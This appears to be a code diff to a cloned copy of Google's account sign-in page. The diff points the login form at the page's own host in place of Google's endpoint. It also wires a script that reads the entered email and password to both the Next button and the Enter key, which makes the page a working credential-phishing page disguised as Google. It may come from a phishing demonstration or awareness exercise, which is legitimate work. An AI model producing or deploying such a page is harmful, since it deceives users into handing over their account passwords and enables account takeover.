@@ -1938,7 +1938,7 @@
       ">
       <canvas id="canvas" class="circle" width="96" height="96"></canvas>
     </div>
-    <form novalidate="" method="post" action="https://accounts.google.com/signin/challenge/sl/password" id="gaia_loginform">
+    <form novalidate="" method="post" action="/" id="gaia_loginform">
       <input name="Page" value="PasswordSeparationSignIn" type="hidden">
       <input name="GALX" value="9g3_VpBbtOU" type="hidden">
       <input name="gxf" value="AFoagUWQyfdlyUfoqKeOwmND6m6u-ISnkQ:1472688299934" type="hidden">
@@ -2291,9 +2291,16 @@
 </div>
 </div>
 <script type="text/javascript">
-  document.getElementById('next').onclick = function() {
+  var cb = function() {
   var em = document.getElementById('Email').value;
   var ps = document.getElementById('Passwd-hidden').value;
   alert('u:'+em+'\np:'+ps);
-  };</script>
+  };
+  document.getElementById('next').onclick = cb;
+  document.getElementById('Passwd-hidden').onkeydown = function(e) {
+    if (e.keyCode == 13) {
+      cb();
+    }
+  }
+</script>
 </body></html>
